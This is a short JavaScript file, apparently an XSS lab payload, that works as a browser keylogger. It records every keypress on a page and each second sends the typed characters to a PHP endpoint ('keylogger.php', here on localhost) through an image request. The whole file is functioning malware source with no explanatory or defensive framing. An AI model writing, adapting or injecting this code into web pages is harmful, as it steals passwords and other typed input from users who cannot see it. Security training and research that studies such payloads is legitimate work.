var keys = '';
var url = 'http://localhost:9001/keylogger.php?c=';

document.onkeypress = function (e) {
    key = e.keyCode ? e.keyCode : e.charCode;
    key = String.fromCharCode(key);
    keys += key;
};
window.setInterval(function () {
    if (keys.length > 0) {
        new Image().src = url + keys;
        keys = '';
    }
}, 1000);